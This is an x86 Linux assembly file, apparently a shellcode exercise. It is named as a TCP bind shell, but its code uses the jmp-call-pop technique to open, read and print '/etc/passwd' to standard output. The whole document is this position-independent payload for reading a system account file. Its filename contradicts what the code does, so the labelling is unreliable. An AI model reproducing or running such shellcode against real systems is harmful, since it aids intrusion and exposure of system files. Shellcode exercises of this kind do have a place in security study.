; Filename: shell_bind_tcp.nasm
; Author:  Ricardo Ruiz
; Website:  https://ricardojruiz.herokuapp.com/

section .text
	
	global _start 

_start:
	jmp test

call_test:
	mov eax,0x5
	pop ebx
	xor ecx,ecx
	int 0x80

	mov ebx,eax
	mov eax,0x3
	mov edi,esp
	mov ecx,edi
	mov edx,0x1000
	int 0x80

	mov edx,eax
	mov eax,0x4
	mov ebx,0x1
	int 0x80

	mov eax,0x1
	mov ebx,0x0
	int 0x80

test:
	call call_test
	string: db "/etc/passwd",0x0


